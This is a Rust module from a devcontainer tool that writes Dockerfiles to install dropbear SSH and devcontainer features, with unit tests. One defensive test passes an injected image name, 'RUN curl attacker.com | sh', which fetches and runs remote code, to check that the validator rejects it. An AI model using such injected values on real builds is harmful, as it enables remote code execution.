//! Build helpers for injecting devc requirements into container images
//!
//! This module handles injecting SSH support (dropbear) into container images
//! at build time, so container startup is fast.

use crate::features::dockerfile::generate_all_feature_layers;
use crate::features::resolve::ResolvedFeature;
use crate::{CoreError, Result};
use std::path::{Path, PathBuf};

/// Validate that an image name is safe to embed in a Dockerfile FROM instruction.
///
/// Rejects empty names and names containing control characters (newlines, etc.)
/// which could inject arbitrary Dockerfile instructions.
fn validate_image_name(name: &str) -> Result<()> {
    if name.is_empty() {
        return Err(CoreError::InvalidState("Image name cannot be empty".into()));
    }
    if name.chars().any(|c| c.is_control()) {
        return Err(CoreError::InvalidState(format!(
            "Image name contains invalid characters: {:?}",
            name
        )));
    }
    Ok(())
}

/// Dropbear and socat installation script that detects the package manager
/// socat is needed to bridge pipes to sockets for SSH over stdio
/// Note: This script runs as USER root; the caller must restore the original USER afterward
const DROPBEAR_INSTALL_SCRIPT: &str = r#"
# Install dropbear and socat for devc SSH support
# Switch to root for package installation
USER root
RUN set -e; \
    if command -v apt-get >/dev/null 2>&1; then \
        apt-get update -qq && apt-get install -y -qq dropbear socat && rm -rf /var/lib/apt/lists/*; \
    elif command -v dnf >/dev/null 2>&1; then \
        dnf install -y -q dropbear socat && dnf clean all; \
    elif command -v yum >/dev/null 2>&1; then \
        yum install -y -q dropbear socat && yum clean all; \
    elif command -v apk >/dev/null 2>&1; then \
        apk add --no-cache dropbear socat; \
    elif command -v pacman >/dev/null 2>&1; then \
        pacman -Sy --noconfirm dropbear socat && pacman -Scc --noconfirm; \
    elif command -v zypper >/dev/null 2>&1; then \
        zypper -n install dropbear socat && zypper clean; \
    fi
"#;

/// Creates an enhanced Dockerfile that includes devc requirements (dropbear)
///
/// For image-based devcontainers, creates a new Dockerfile that extends the base image.
/// For Dockerfile-based, appends the installation to the existing Dockerfile.
pub struct EnhancedBuildContext {
    /// Temporary directory containing the enhanced build context
    temp_dir: tempfile::TempDir,
    /// Path to the enhanced Dockerfile
    dockerfile_path: PathBuf,
}

impl EnhancedBuildContext {
    /// Create an enhanced build context from a base image
    ///
    /// Creates a temporary Dockerfile that:
    /// 1. FROM <base_image>
    /// 2. Installs dropbear
    pub fn from_image(base_image: &str) -> Result<Self> {
        validate_image_name(base_image)?;
        let temp_dir = tempfile::tempdir()?;
        let dockerfile_path = temp_dir.path().join("Dockerfile");

        let dockerfile_content = format!("FROM {}\n{}", base_image, DROPBEAR_INSTALL_SCRIPT);

        std::fs::write(&dockerfile_path, dockerfile_content)?;

        Ok(Self {
            temp_dir,
            dockerfile_path,
        })
    }

    /// Create an enhanced build context from an existing Dockerfile
    ///
    /// Copies the original build context and appends dropbear installation
    /// to the Dockerfile. If the original Dockerfile has a USER instruction,
    /// restores that user after the root-privileged installation.
    pub fn from_dockerfile(original_context: &Path, dockerfile_name: &str) -> Result<Self> {
        let temp_dir = tempfile::tempdir()?;

        // Copy the entire build context to temp directory
        copy_dir_recursive(original_context, temp_dir.path())?;

        // Append dropbear installation to the Dockerfile
        let dockerfile_path = temp_dir.path().join(dockerfile_name);
        let original_content = std::fs::read_to_string(&dockerfile_path)?;

        // Find the last USER instruction to restore after dropbear install
        // This handles cases where the Dockerfile switches to a non-root user
        let last_user = original_content
            .lines()
            .rev()
            .find(|line| {
                let trimmed = line.trim();
                trimmed.to_uppercase().starts_with("USER ") && !trimmed.starts_with('#')
            })
            .map(|line| line.trim().to_string());

        // Build the user restore instruction if needed
        let user_restore = last_user
            .map(|u| format!("\n# Restore original user\n{}", u))
            .unwrap_or_default();

        let enhanced_content = format!(
            "{}\n\n# Added by devc for SSH support{}{}",
            original_content, DROPBEAR_INSTALL_SCRIPT, user_restore
        );

        std::fs::write(&dockerfile_path, enhanced_content)?;

        Ok(Self {
            temp_dir,
            dockerfile_path,
        })
    }

    /// Create an enhanced build context from a base image with features.
    ///
    /// Generates a Dockerfile with FROM, feature COPY+RUN layers, and optional SSH.
    pub fn from_image_with_features(
        base_image: &str,
        features: &[ResolvedFeature],
        inject_ssh: bool,
        remote_user: &str,
    ) -> Result<Self> {
        validate_image_name(base_image)?;
        let temp_dir = tempfile::tempdir()?;
        let dockerfile_path = temp_dir.path().join("Dockerfile");

        // Copy feature directories into build context
        copy_features_to_context(features, temp_dir.path())?;

        let feature_layers = generate_all_feature_layers(features, "feature", remote_user);

        let ssh_section = if inject_ssh {
            DROPBEAR_INSTALL_SCRIPT.to_string()
        } else {
            String::new()
        };

        let dockerfile_content = format!(
            "FROM {}\nUSER root\n\n{}\n{}",
            base_image, feature_layers, ssh_section
        );

        // If remote_user is not root, restore it at the end
        let dockerfile_content = if remote_user != "root" {
            format!("{}\nUSER {}\n", dockerfile_content.trim_end(), remote_user)
        } else {
            dockerfile_content
        };

        std::fs::write(&dockerfile_path, dockerfile_content)?;

        Ok(Self {
            temp_dir,
            dockerfile_path,
        })
    }

    /// Create an enhanced build context from a Dockerfile with features.
    ///
    /// Copies original context, appends feature layers and optional SSH,
    /// then restores the original USER.
    pub fn from_dockerfile_with_features(
        original_context: &Path,
        dockerfile_name: &str,
        features: &[ResolvedFeature],
        inject_ssh: bool,
        remote_user: &str,
    ) -> Result<Self> {
        let temp_dir = tempfile::tempdir()?;

        // Copy the entire build context to temp directory
        copy_dir_recursive(original_context, temp_dir.path())?;

        // Copy feature directories into build context
        copy_features_to_context(features, temp_dir.path())?;

        let dockerfile_path = temp_dir.path().join(dockerfile_name);
        let original_content = std::fs::read_to_string(&dockerfile_path)?;

        // Find the last USER instruction to restore after features + SSH
        let last_user = original_content
            .lines()
            .rev()
            .find(|line| {
                let trimmed = line.trim();
                trimmed.to_uppercase().starts_with("USER ") && !trimmed.starts_with('#')
            })
            .map(|line| line.trim().to_string());

        let feature_layers = generate_all_feature_layers(features, "feature", remote_user);

        let ssh_section = if inject_ssh {
            format!(
                "\n# Added by devc for SSH support{}",
                DROPBEAR_INSTALL_SCRIPT
            )
        } else {
            String::new()
        };

        let user_restore = last_user
            .map(|u| format!("\n# Restore original user\n{}", u))
            .unwrap_or_default();

        let enhanced_content = format!(
            "{}\n\nUSER root\n# Install devcontainer features\n{}{}{}",
            original_content, feature_layers, ssh_section, user_restore
        );

        std::fs::write(&dockerfile_path, enhanced_content)?;

        Ok(Self {
            temp_dir,
            dockerfile_path,
        })
    }

    /// Get the path to the build context directory
    pub fn context_path(&self) -> &Path {
        self.temp_dir.path()
    }

    /// Get the Dockerfile name (relative to context)
    pub fn dockerfile_name(&self) -> &str {
        self.dockerfile_path
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("Dockerfile")
    }
}

/// Recursively copy a directory
fn copy_dir_recursive(src: &Path, dst: &Path) -> Result<()> {
    if !dst.exists() {
        std::fs::create_dir_all(dst)?;
    }

    for entry in std::fs::read_dir(src)? {
        let entry = entry?;
        let src_path = entry.path();
        let dst_path = dst.join(entry.file_name());

        if src_path.is_dir() {
            copy_dir_recursive(&src_path, &dst_path)?;
        } else {
            std::fs::copy(&src_path, &dst_path)?;
        }
    }

    Ok(())
}

/// Copy feature directories into the build context so they can be COPY'd in the Dockerfile.
fn copy_features_to_context(features: &[ResolvedFeature], context_dir: &Path) -> Result<()> {
    for (i, feature) in features.iter().enumerate() {
        let short_name = feature
            .id
            .rsplit_once('/')
            .map(|(_, n)| n)
            .unwrap_or(&feature.id)
            .replace(':', "-");
        let dir_name = format!("feature-{}-{}", i, short_name);
        let dst = context_dir.join(&dir_name);
        copy_dir_recursive(&feature.dir, &dst)?;
        // Ensure files are readable by Podman's rootless build process
        // (runs in a user namespace that may lack access to 0700 temp dirs)
        #[cfg(unix)]
        make_world_readable(&dst)?;
    }
    Ok(())
}

/// Recursively ensure a directory tree is world-readable (and executable for dirs).
///
/// Podman rootless builds run in a user namespace where the build process may not
/// have access to files in the host's temp directory (mode 0700). This adds the
/// read bit for others on files and read+execute on directories.
#[cfg(unix)]
fn make_world_readable(path: &Path) -> Result<()> {
    use std::os::unix::fs::PermissionsExt;
    for entry in std::fs::read_dir(path)? {
        let entry = entry?;
        let p = entry.path();
        let mut perms = std::fs::metadata(&p)?.permissions();
        if p.is_dir() {
            perms.set_mode(perms.mode() | 0o055);
            std::fs::set_permissions(&p, perms)?;
            make_world_readable(&p)?;
        } else {
            perms.set_mode(perms.mode() | 0o044);
            std::fs::set_permissions(&p, perms)?;
        }
    }
    // Also fix the directory itself
    let mut perms = std::fs::metadata(path)?.permissions();
    perms.set_mode(perms.mode() | 0o055);
    std::fs::set_permissions(path, perms)?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    // ==================== validate_image_name tests ====================

    #[test]
    fn test_validate_image_name_valid() {
        assert!(validate_image_name("ubuntu:22.04").is_ok());
        assert!(validate_image_name("ghcr.io/org/image:latest").is_ok());
        assert!(validate_image_name("localhost:5000/img").is_ok());
        assert!(validate_image_name("mcr.microsoft.com/devcontainers/base:ubuntu").is_ok());
    }

    #[test]
    fn test_validate_image_name_rejects_newline() {
        let result = validate_image_name("ubuntu:22.04\nRUN curl attacker.com | sh");
        assert!(result.is_err());
    }

    #[test]
    fn test_validate_image_name_rejects_empty() {
        assert!(validate_image_name("").is_err());
    }

    #[test]
    fn test_from_image_rejects_malicious_name() {
        let result = EnhancedBuildContext::from_image("bad\nRUN evil");
        assert!(result.is_err());
    }

    #[test]
    fn test_from_image_with_features_rejects_malicious_name() {
        let result =
            EnhancedBuildContext::from_image_with_features("bad\rimage", &[], false, "root");
        assert!(result.is_err());
    }

    // ==================== copy_dir_recursive tests ====================

    #[test]
    fn test_copy_dir_recursive_basic() {
        let src = tempfile::tempdir().unwrap();
        let dst = tempfile::tempdir().unwrap();

        std::fs::write(src.path().join("file1.txt"), "hello").unwrap();
        std::fs::write(src.path().join("file2.txt"), "world").unwrap();

        copy_dir_recursive(src.path(), dst.path()).unwrap();

        assert_eq!(
            std::fs::read_to_string(dst.path().join("file1.txt")).unwrap(),
            "hello"
        );
        assert_eq!(
            std::fs::read_to_string(dst.path().join("file2.txt")).unwrap(),
            "world"
        );
    }

    #[test]
    fn test_copy_dir_recursive_nested() {
        let src = tempfile::tempdir().unwrap();
        let dst = tempfile::tempdir().unwrap();

        std::fs::create_dir_all(src.path().join("sub/deep")).unwrap();
        std::fs::write(src.path().join("sub/deep/file.txt"), "nested").unwrap();

        copy_dir_recursive(src.path(), dst.path()).unwrap();

        assert_eq!(
            std::fs::read_to_string(dst.path().join("sub/deep/file.txt")).unwrap(),
            "nested"
        );
    }

    #[test]
    fn test_copy_dir_recursive_empty_dir() {
        let src = tempfile::tempdir().unwrap();
        let dst_parent = tempfile::tempdir().unwrap();
        let dst = dst_parent.path().join("output");

        // Empty src directory
        copy_dir_recursive(src.path(), &dst).unwrap();
        assert!(dst.exists());
    }

    // ==================== from_dockerfile user restore tests ====================

    #[test]
    fn test_from_dockerfile_commented_user() {
        let temp_dir = tempfile::tempdir().unwrap();
        let dockerfile_content = "FROM fedora:latest\n# USER vscode\nRUN echo hello\n";
        std::fs::write(temp_dir.path().join("Dockerfile"), dockerfile_content).unwrap();

        let ctx = EnhancedBuildContext::from_dockerfile(temp_dir.path(), "Dockerfile").unwrap();
        let enhanced = std::fs::read_to_string(ctx.context_path().join("Dockerfile")).unwrap();

        // Commented USER should NOT trigger user restore
        assert!(!enhanced.contains("Restore original user"));
    }

    #[test]
    fn test_from_image_dockerfile_content() {
        let ctx = EnhancedBuildContext::from_image("alpine:3.18").unwrap();
        let dockerfile = std::fs::read_to_string(ctx.context_path().join("Dockerfile")).unwrap();

        assert!(dockerfile.starts_with("FROM alpine:3.18"));
        assert!(dockerfile.contains("dropbear"));
        assert!(dockerfile.contains("socat"));
    }

    #[test]
    fn test_context_path_and_dockerfile_name() {
        let ctx = EnhancedBuildContext::from_image("ubuntu:22.04").unwrap();
        assert!(ctx.context_path().exists());
        assert_eq!(ctx.dockerfile_name(), "Dockerfile");
    }

    // ==================== Existing tests ====================

    #[test]
    fn test_from_image() {
        let ctx = EnhancedBuildContext::from_image("python:3.12").unwrap();
        let dockerfile = std::fs::read_to_string(ctx.context_path().join("Dockerfile")).unwrap();

        assert!(dockerfile.starts_with("FROM python:3.12"));
        assert!(dockerfile.contains("dropbear"));
        assert!(dockerfile.contains("USER root"));
    }

    #[test]
    fn test_dropbear_script_valid() {
        // Ensure the script has proper Dockerfile syntax
        assert!(DROPBEAR_INSTALL_SCRIPT.contains("USER root"));
        assert!(DROPBEAR_INSTALL_SCRIPT.contains("RUN"));
        assert!(DROPBEAR_INSTALL_SCRIPT.contains("apt-get"));
        assert!(DROPBEAR_INSTALL_SCRIPT.contains("dnf"));
        assert!(DROPBEAR_INSTALL_SCRIPT.contains("apk"));
    }

    #[test]
    fn test_from_dockerfile_restores_user() {
        // Create a temp directory with a Dockerfile that has a USER instruction
        let temp_dir = tempfile::tempdir().unwrap();
        let dockerfile_content = r#"FROM fedora:latest
RUN dnf install -y bash
USER vscode
SHELL ["/bin/bash", "-c"]
"#;
        std::fs::write(temp_dir.path().join("Dockerfile"), dockerfile_content).unwrap();

        let ctx = EnhancedBuildContext::from_dockerfile(temp_dir.path(), "Dockerfile").unwrap();
        let enhanced = std::fs::read_to_string(ctx.context_path().join("Dockerfile")).unwrap();

        // Should contain USER root for installation
        assert!(enhanced.contains("USER root"));
        // Should contain dropbear installation
        assert!(enhanced.contains("dropbear"));
        // Should restore the original user at the end
        // The last USER instruction should be "USER vscode"
        let lines: Vec<&str> = enhanced.lines().collect();
        let user_lines: Vec<&&str> = lines
            .iter()
            .filter(|l| l.trim().to_uppercase().starts_with("USER "))
            .collect();
        assert!(
            user_lines.len() >= 2,
            "Should have at least 2 USER instructions"
        );
        assert!(
            user_lines.last().unwrap().contains("vscode"),
            "Last USER should restore to vscode"
        );
    }

    #[test]
    fn test_from_dockerfile_no_user() {
        // Create a temp directory with a Dockerfile without USER instruction
        let temp_dir = tempfile::tempdir().unwrap();
        let dockerfile_content = r#"FROM fedora:latest
RUN dnf install -y bash
"#;
        std::fs::write(temp_dir.path().join("Dockerfile"), dockerfile_content).unwrap();

        let ctx = EnhancedBuildContext::from_dockerfile(temp_dir.path(), "Dockerfile").unwrap();
        let enhanced = std::fs::read_to_string(ctx.context_path().join("Dockerfile")).unwrap();

        // Should contain USER root for installation
        assert!(enhanced.contains("USER root"));
        // Should contain dropbear installation
        assert!(enhanced.contains("dropbear"));
        // Should NOT have "Restore original user" since there was no USER instruction
        assert!(!enhanced.contains("Restore original user"));
    }

    // ==================== Feature-aware build context tests ====================

    fn make_test_features() -> (tempfile::TempDir, Vec<ResolvedFeature>) {
        use crate::features::resolve::FeatureMetadata;

        let tmp = tempfile::tempdir().unwrap();

        // Create a fake feature directory with install.sh
        let feature_dir = tmp.path().join("node-feature");
        std::fs::create_dir_all(&feature_dir).unwrap();
        std::fs::write(
            feature_dir.join("install.sh"),
            "#!/bin/bash\necho installing node",
        )
        .unwrap();
        std::fs::write(
            feature_dir.join("devcontainer-feature.json"),
            r#"{"id": "node"}"#,
        )
        .unwrap();

        let mut options = std::collections::HashMap::new();
        options.insert("version".to_string(), "20".to_string());

        let features = vec![ResolvedFeature {
            id: "ghcr.io/devcontainers/features/node:1".to_string(),
            dir: feature_dir,
            options,
            metadata: FeatureMetadata {
                id: Some("node".to_string()),
                ..Default::default()
            },
        }];

        (tmp, features)
    }

    #[test]
    fn test_from_image_with_features() {
        let (_tmp, features) = make_test_features();

        let ctx = EnhancedBuildContext::from_image_with_features(
            "ubuntu:22.04",
            &features,
            false,
            "vscode",
        )
        .unwrap();

        let dockerfile = std::fs::read_to_string(ctx.context_path().join("Dockerfile")).unwrap();

        // Should have FROM
        assert!(dockerfile.starts_with("FROM ubuntu:22.04"));
        // Should have feature COPY+RUN
        assert!(dockerfile.contains("COPY feature-0-node-1/ /tmp/dev-container-feature/"));
        assert!(dockerfile.contains("VERSION=20"));
        assert!(dockerfile.contains("_REMOTE_USER=vscode"));
        assert!(dockerfile.contains("install.sh"));
        // Should NOT have dropbear (inject_ssh=false)
        assert!(!dockerfile.contains("dropbear"));
        // Should restore user at end
        assert!(dockerfile.contains("USER vscode"));

        // Feature files should be copied into context
        assert!(ctx
            .context_path()
            .join("feature-0-node-1/install.sh")
            .exists());
    }

    #[test]
    fn test_from_image_with_features_and_ssh() {
        let (_tmp, features) = make_test_features();

        let ctx = EnhancedBuildContext::from_image_with_features(
            "ubuntu:22.04",
            &features,
            true,
            "vscode",
        )
        .unwrap();

        let dockerfile = std::fs::read_to_string(ctx.context_path().join("Dockerfile")).unwrap();

        // Should have both features and SSH
        assert!(dockerfile.contains("COPY feature-0-node-1/"));
        assert!(dockerfile.contains("dropbear"));
        assert!(dockerfile.contains("USER vscode"));
    }

    #[test]
    fn test_from_dockerfile_with_features() {
        let (_tmp, features) = make_test_features();

        let ctx_dir = tempfile::tempdir().unwrap();
        std::fs::write(
            ctx_dir.path().join("Dockerfile"),
            "FROM python:3.12\nUSER developer\n",
        )
        .unwrap();

        let ctx = EnhancedBuildContext::from_dockerfile_with_features(
            ctx_dir.path(),
            "Dockerfile",
            &features,
            false,
            "developer",
        )
        .unwrap();

        let dockerfile = std::fs::read_to_string(ctx.context_path().join("Dockerfile")).unwrap();

        // Should have original content
        assert!(dockerfile.contains("FROM python:3.12"));
        // Should have feature layers
        assert!(dockerfile.contains("COPY feature-0-node-1/"));
        assert!(dockerfile.contains("VERSION=20"));
        // Should NOT have SSH
        assert!(!dockerfile.contains("dropbear"));
        // Should restore original user
        assert!(dockerfile.contains("Restore original user"));
        // Last USER line should be the restored user
        let last_user_line = dockerfile
            .lines()
            .rev()
            .find(|l| l.trim().to_uppercase().starts_with("USER "))
            .unwrap();
        assert!(last_user_line.contains("developer"));
    }

    #[test]
    fn test_from_dockerfile_with_features_and_ssh() {
        let (_tmp, features) = make_test_features();

        let ctx_dir = tempfile::tempdir().unwrap();
        std::fs::write(
            ctx_dir.path().join("Dockerfile"),
            "FROM python:3.12\nUSER developer\n",
        )
        .unwrap();

        let ctx = EnhancedBuildContext::from_dockerfile_with_features(
            ctx_dir.path(),
            "Dockerfile",
            &features,
            true,
            "developer",
        )
        .unwrap();

        let dockerfile = std::fs::read_to_string(ctx.context_path().join("Dockerfile")).unwrap();

        // Should have features + SSH + user restore
        assert!(dockerfile.contains("COPY feature-0-node-1/"));
        assert!(dockerfile.contains("dropbear"));
        assert!(dockerfile.contains("Restore original user"));
    }
}
